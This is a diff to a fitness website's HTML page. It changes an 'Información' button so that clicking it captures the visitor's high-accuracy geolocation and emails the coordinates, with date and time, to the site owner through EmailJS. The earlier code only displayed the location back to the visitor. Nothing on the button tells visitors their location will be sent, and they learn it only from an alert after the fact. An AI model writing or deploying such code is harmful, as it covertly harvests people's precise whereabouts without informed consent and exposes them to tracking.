@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <link rel="stylesheet" href="style.css">
   <title> Get informed, Get stronger</title>
+   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-3FPFHZ8J4C"></script>
   <script>
@@ -34,7 +35,7 @@
 
     <div class="main-buttons">
       <button>Ver ejercicios</button>
-      <button onclick="obtenerUbicacion()">Información</button>
+      <button onclick="enviarUbicacion()">Información</button>
     </div>
   </main>
   
@@ -57,45 +58,41 @@
     
     </div>
   </footer>
-
-
-<p id="resultado"></p>
-
 <script>
-function obtenerUbicacion() {
-  if (!navigator.geolocation) {
-    document.getElementById("resultado").innerText =
-      "Tu navegador no soporta geolocalización.";
-    return;
-  }
+(function(){
+  emailjs.init("7ZkQhtdWcNvlOaRLm");
+})();
 
+function enviarUbicacion() {
   navigator.geolocation.getCurrentPosition(
-    (position) => {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const precision = position.coords.accuracy;
+    (pos) => {
+      const now = new Date();
 
-      document.getElementById("resultado").innerText =
-        `Latitud: ${lat}
-Longitud: ${lon}
-Precisión: ${precision} metros`;
-
-      // AQUÍ enviarías los datos a tu backend
-      // fetch("/guardar-ubicacion", { ... })
+      emailjs.send(
+        "service_97msm1r",
+        "template_233vpyl",
+        {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          accuracy: Math.round(pos.coords.accuracy),
+          date: now.toLocaleDateString(),
+          time: now.toLocaleTimeString()
+        }
+      ).then(() => {
+        alert("📩 Ubicación enviada correctamente");
+      }).catch((err) => {
+        console.error(err);
+        alert("❌ Error enviando la ubicación");
+      });
     },
-    (error) => {
-      document.getElementById("resultado").innerText =
-        "No se pudo obtener la ubicación.";
-    },
-    {
-      enableHighAccuracy: true
-    }
+    () => alert("❌ No se pudo obtener la ubicación"),
+    { enableHighAccuracy: true }
   );
 }
 </script>
-
 </body>
 </html>
+
 
 
 
